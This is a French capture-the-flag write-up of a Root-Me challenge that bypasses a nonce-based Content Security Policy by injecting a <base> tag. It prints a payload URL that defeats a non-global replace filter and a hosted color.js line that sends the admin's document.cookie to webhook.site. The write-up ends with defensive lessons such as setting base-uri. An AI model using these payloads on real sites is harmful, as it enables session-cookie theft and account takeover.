# Write-up — CSP Bypass Nonce 2
**Plateforme :** Root-Me  
**Catégorie :** Web Client  
**Difficulté :** Moyen (35 pts)  
**Auteur du challenge :** Ruulian  
**Objectif :** Voler le cookie de session de l'administrateur malgré une CSP avec nonce

---

## 1. Comprendre la CSP (Content Security Policy)

La CSP est une **politique de sécurité** que le serveur envoie au navigateur via un header HTTP pour lui dire :

> *"Tu as le droit de charger uniquement ces ressources et d'exécuter uniquement ce code JavaScript."*

### Les directives principales

| Directive | Rôle |
|---|---|
| `default-src` | Règle par défaut pour toutes les ressources |
| `script-src` | Contrôle les fichiers JavaScript |
| `style-src` | Contrôle les fichiers CSS |
| `img-src` | Contrôle les images |
| `connect-src` | Contrôle les requêtes réseau (`fetch`, AJAX, WebSocket) |
| `frame-src` | Contrôle les iframes |
| `frame-ancestors` | Empêche ton site d'être mis dans une iframe (anti-clickjacking) |
| `object-src` | Contrôle les plugins (Flash, PDF embarqués) |
| `base-uri` | Contrôle la balise `<base href="...">` |
| `form-action` | Contrôle où les formulaires peuvent envoyer leurs données |

### Les mots-clés importants

| Mot-clé | Signification |
|---|---|
| `'self'` | Uniquement depuis le même domaine |
| `'none'` | Rien n'est autorisé |
| `*` | Tout est autorisé (déconseillé) |
| `'unsafe-inline'` | Autorise le JS/CSS inline dans la page |
| `'unsafe-eval'` | Autorise `eval()` et `new Function()` |
| `nonce-xxx` | Autorise uniquement les scripts portant ce code secret |
| `sha256-xxx` | Autorise uniquement le script dont le hash correspond exactement |

### Le mécanisme du Nonce

Le serveur génère une valeur aléatoire unique **à chaque réponse HTTP** :

```
Content-Security-Policy: script-src 'nonce-abc123'
```

Et place ce même nonce sur les balises `<script>` légitimes :

```html
<script nonce="abc123">
  console.log("Ce script est autorisé");
</script>
```

Le navigateur compare le nonce du header avec celui de la balise. S'ils correspondent → ✅ exécution. Sinon → ❌ bloqué.

> **Point clé :** Le nonce est sur la **balise HTML**, pas sur le **contenu du fichier JS**. Le navigateur vérifie le nonce, puis charge le fichier indiqué dans `src=` sans re-vérification.

---

## 2. Reconnaissance du challenge

### La CSP de la cible

```
Content-Security-Policy:
  connect-src 'none';
  font-src 'self';
  frame-src 'none';
  img-src 'self';
  manifest-src 'none';
  media-src 'none';
  object-src 'none';
  script-src 'nonce-55d5540319147a7de617ec6647d7c791';
  style-src 'self';
  worker-src 'none';
  frame-ancestors 'none';
  block-all-mixed-content;
```

### Analyse de la CSP

- `script-src 'nonce-...'` → impossible d'injecter un `<script>` sans le bon nonce
- `connect-src 'none'` → `fetch()` et `XMLHttpRequest` vers l'extérieur bloqués
- `img-src 'self'` → `<img src="https://mon-serveur.com/steal">` bloqué
- ⚠️ **`base-uri` est ABSENT** → personne n'a restreint la balise `<base>` → **c'est notre faille**

### Le HTML de la page

```html
<script src="/web-client/ch62/script.js" nonce="55d5540319..."></script>
<script src="/web-client/ch62/color.js" nonce="55d5540319..."></script>
```

Ces deux scripts ont déjà le bon nonce → ils **vont s'exécuter quoi qu'il arrive**.

### Le code de script.js (point d'injection)

```js
// Au chargement initial : filtre IMPARFAIT
if(document.location.hash.split("#")[1] != undefined){
    res.innerHTML = decodeURI(hash).replace("<", "&lt;").replace(">", "&gt;");
}

// Sur changement de hash : AUCUN filtre
window.onhashchange = () => {
    res.innerHTML = decodeURI(h); // injection HTML directe ici
}
```

**Pourquoi le filtre est imparfait :**  
`.replace()` sans le flag `/g` ne remplace que **la première occurrence**. En ajoutant un tag sacrificiel `<x>` en début de payload, on "consomme" le premier remplacement, laissant notre vraie balise `<base>` intacte.

---

## 3. Compréhension de la faille : comment `<base>` détourne les scripts

### Sans `<base>` (comportement normal)

Le navigateur voit :
```html
<script src="/web-client/ch62/color.js" nonce="55d5...">
```

Il calcule l'adresse complète :
```
domaine actuel + chemin relatif
= http://challenge01.root-me.org + /web-client/ch62/color.js
= http://challenge01.root-me.org/web-client/ch62/color.js  ✅ fichier légitime
```

### Avec notre `<base>` injectée

On injecte :
```html
<base href="https://notre-serveur.com/">
```

Le navigateur voit le même `<script>` :
```html
<script src="/web-client/ch62/color.js" nonce="55d5...">
```

Il calcule maintenant :
```
base injectée + chemin relatif
= https://notre-serveur.com + /web-client/ch62/color.js
= https://notre-serveur.com/web-client/ch62/color.js  💀 notre fichier malveillant
```

> **Le nonce est valide (il est sur la balise HTML, pas dans le fichier). La CSP laisse passer. Notre code s'exécute.**

### L'analogie

> Imagine que tu demandes à quelqu'un : *"Va chercher le pain au magasin du quartier."*  
> **Sans `<base>`** → il va au bon magasin (root-me).  
> **Avec notre `<base>`** → on a changé sa définition du "quartier" → il va chez nous à la place.  
> La phrase "magasin du quartier" n'a pas changé. Seulement la définition du quartier.

---

## 4. Chaîne d'exploitation complète

### Étape 1 — Préparer le serveur malveillant

Héberger sur GitHub Pages (ou tout serveur public) le fichier `color.js` **au même chemin** que sur le site cible :

**Chemin :** `/web-client/ch62/color.js`

**Contenu malveillant :**
```js
document.location = "https://webhook.site/MON-ID?c=" + document.cookie;
```

**Pourquoi `document.location` fonctionne malgré la CSP :**  
`connect-src 'none'` bloque `fetch()`. `img-src 'self'` bloque les images externes.  
Mais `navigate-to` n'est **pas dans la CSP** → une simple redirection de page n'est pas restreinte.

### Étape 2 — Contourner le filtre et injecter `<base>`

Payload injecté via le hash de l'URL :
```
http://challenge01.root-me.org/web-client/ch62/#<x><base href="https://notre-serveur.com/">
```

**Explication du `<x>` sacrificiel :**  
Le filtre `.replace("<", "&lt;").replace(">", "&gt;")` échappe uniquement la **première** occurrence de `<` et `>`. Le tag `<x>` les "consomme", laissant `<base href="...">` intact dans le DOM.

### Étape 3 — Envoyer le payload au bot admin

Le formulaire `contact.php` simule un **bot admin** qui visite l'URL soumise avec ses propres cookies de session. On lui soumet notre URL piégée.

### Étape 4 — Récupérer le cookie

Sur webhook.site, la requête du bot arrive avec le cookie en paramètre `c=`.

---

## 5. Schéma de l'attaque

```
Attaquant soumet l'URL dans contact.php
              ↓
Bot admin visite la page Colorizer avec notre hash
              ↓
script.js lit le hash → injecte <base href="notre-serveur"> dans le DOM
              ↓
Les <script nonce="✅"> légitimes rechargent depuis notre serveur
              ↓
Notre color.js malveillant s'exécute (nonce valide → CSP OK)
              ↓
document.location redirige le bot vers webhook.site?c=COOKIE
              ↓
On récupère le cookie admin → FLAG ✅
```

---

## 6. Pourquoi on ne peut pas simplement injecter du JS directement

### Raison 1 — Règle du navigateur (indépendante de la CSP)

Un `<script>` injecté via `innerHTML` **ne s'exécute jamais**.  
C'est une règle fondamentale du navigateur, pas liée à la CSP.

```js
res.innerHTML = "<script>alert(1)</script>";
// Le tag apparaît dans le DOM, mais n'est JAMAIS exécuté
```

### Raison 2 — La CSP bloque les scripts sans nonce

Même via un event handler comme `onerror="..."`, la CSP intervient :
```
script-src 'nonce-55d5...'
```
Tout JS inline sans le bon nonce → ❌ bloqué.

### La seule issue

Utiliser un script **déjà autorisé** par la CSP (qui a le bon nonce) et **changer sa source** via `<base>`.

---

## 7. Leçons retenues

| Concept | Ce qu'il faut retenir |
|---|---|
| **CSP nonce** | Protège contre l'injection de nouveaux scripts, pas contre le détournement de scripts déjà autorisés |
| **`base-uri 'none'`** | Directive souvent oubliée — son absence permet l'injection de `<base>` |
| **`innerHTML` + `<script>`** | Un script injecté via innerHTML ne s'exécute jamais, quelle que soit la CSP |
| **`.replace()` sans `/g`** | N'échappe que la première occurrence — filtre facilement contournable |
| **`document.location`** | Non restreint par la CSP sauf si `navigate-to` est défini — vecteur d'exfiltration valide |
| **Le nonce est sur la balise, pas le fichier** | Le navigateur ne vérifie pas l'origine du fichier JS, seulement le nonce sur la balise HTML |

> **La leçon fondamentale : La CSP ne peut pas protéger un script qu'elle a elle-même autorisé.**

---

*Write-up rédigé après résolution du challenge sur Root-Me*  
*Auteur : Soumia Badaoui*
